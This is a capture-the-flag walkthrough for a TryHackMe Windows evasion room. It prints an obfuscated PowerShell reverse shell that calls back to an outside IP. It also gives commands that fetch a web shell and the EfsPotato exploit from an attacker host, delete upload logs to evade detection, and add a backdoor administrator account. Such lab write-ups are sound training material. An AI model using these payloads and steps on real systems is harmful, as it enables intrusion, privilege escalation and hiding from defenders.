# [Stealth](https://tryhackme.com/room/stealth)

## Use your evasion skills to pwn a Windows target with an updated defence mechanism.

_Are you stealthier enough to evade all the updated security measures of the target?_

### What is the content of the user level flag?

1. Start by enumerating the target with a full TCP scan and version detection:

```bash
nmap -p- -sVC <TARGET_IP>
```

**Results:**

```
PORT      STATE SERVICE       VERSION
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=HostEvasion
| Not valid before: 2026-04-30T20:32:43
|_Not valid after:  2026-10-30T20:32:43
|_ssl-date: 2026-05-01T20:45:22+00:00; -1s from scanner time.
| rdp-ntlm-info:
|   Target_Name: HOSTEVASION
|   NetBIOS_Domain_Name: HOSTEVASION
|   NetBIOS_Computer_Name: HOSTEVASION
|   DNS_Domain_Name: HostEvasion
|   DNS_Computer_Name: HostEvasion
|   Product_Version: 10.0.17763
|_  System_Time: 2026-05-01T20:44:42+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
8000/tcp  open  http          PHP cli server 5.5 or later
|_http-title: 404 Not Found
8080/tcp  open  http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
|_http-title: PowerShell Script Analyser
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
8443/tcp  open  ssl/http      Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
|_ssl-date: TLS randomness does not represent time
|_http-title: PowerShell Script Analyser
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

2. Prepare a listener:

```bash
nc -lvnp 4444
```

3. The web service on `8443` is a PowerShell script analyser. The likely route is to upload a reverse shell payload to that service. Send the payload from: `https://github.com/martinsohn/PowerShell-reverse-shell/blob/main/powershell-reverse-shell.ps1`

4. Once the shell connects, confirm the session and inspect the remote filesystem:

```bash
pwd
cd C:\Users\evader\Desktop
dir
type encodedflag
```

**Results:**

```
-----BEGIN CERTIFICATE-----
WW91IGNhbiBnZXQgdGhlIGZsYWcgYnkgdmlzaXRpbmcgdGhlIGxpbmsgaHR0cDov
LzxJUF9PRl9USElTX1BDPjo4MDAwL2FzZGFzZGFkYXNkamFramRuc2Rmc2Rmcy5w
aHA=
-----END CERTIFICATE-----
```

5. Decode the Base64 payload using [CyberChef](https://gchq.github.io/CyberChef/). This yields: `You can get the flag by visiting the link http://<IP_OF_THIS_PC>:8000/asdasdadasdjakjdnsdfsdfs.php`

6. Visit the URL in your browser. The page says:

```
Hey, seems like you have uploaded invalid file. Blue team has been alerted.
Hint: Maybe removing the logs files for file uploads can help?
```

7. Remove the upload log file from the webroot:

```bash
rm log.txt
```

8. Reload the URL again. Now the page should return the first user flag.

[SCREEN01]

### What is the content of the root level flag?

1. Inspect the `vulnerable.ps1` reverse shell script on the target:

```bash
type vulnerable.ps1
```

**Results:**

```ps1
Set-Alias -Name K -Value Out-String
Set-Alias -Name nothingHere -Value iex
$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"('10.10.129.75',1234);
$replace = $BT.GetStream();
[byte[]]$B = 0..(32768*2-1)|%{0};
$B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
$replace.Write($B,0,$B.Length)
$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
$replace.Write($B,0,$B.Length)
[byte[]]$int = 0..(10000+55535)|%{0};
while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
$ROM = [text.encoding]::ASCII.GetString($int,0, $i);
$I = (nothingHere $ROM 2>&1 | K );
$I2  = $I + (pwd).Path + '> ';
$U = [text.encoding]::ASCII.GetBytes($I2);
$replace.Write($U,0,$U.Length);
$replace.Flush()};
$BT.Close()
```

2. The script uses `System.Net.Sockets.TCPClient` and executes received commands via `iex`, giving an interactive shell back to your listener. Replace the IP and port in `vulnerable.ps1`, upload it again to `https://<TARGET_IP>:8443/`, and get a stable shell.

3. Check your current privileges:

```bash
whoami /priv
```

**Reesults:**

```
Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

4. Use the webserver on `8080` to deploy a web shell. Download [p0wny-shell](https://github.com/flozz/p0wny-shell) and Host it locally:

```bash
python3 -m http.server
```

6. From the target machine, place the shell into the web root:

```bash
cd C:\xampp\htdocs
iwr -uri "http://<ATTACKER_IP>:8000/shell.php" -o shell.php
```

7. Access the webshell via the web server: `http://<TARGET_IP>:8080/shell.php`, then verify privileges again:

```bash
whoami /priv
```

**Results:**

```
Privilege Name                Description                               State
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

8. Download [EfsPotato](https://github.com/zcgonvh/EfsPotato) on the target from your host:

```bash
curl http://<ATTACKER_IP>:8000/EfsPotato.cs -o C:\xampp\htdocs\efs.cs
```

9. Run `EfsPotato` to spawn an elevated command session and create a new admin user:

```bash
C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe efs.cs -nowarn:1691,618
.\efs.exe "cmd.exe /c net user user password@123 /add && net localgroup administrators user /add"
```

10. Connect to the box via RDP using the new administrator account:

```bash
xfreerdp /v:<TARGET_IP> /u:user /p:'password@123' /cert:ignore
```

11. On the Administrator desktop, read the root flag:

[SCREEN02]
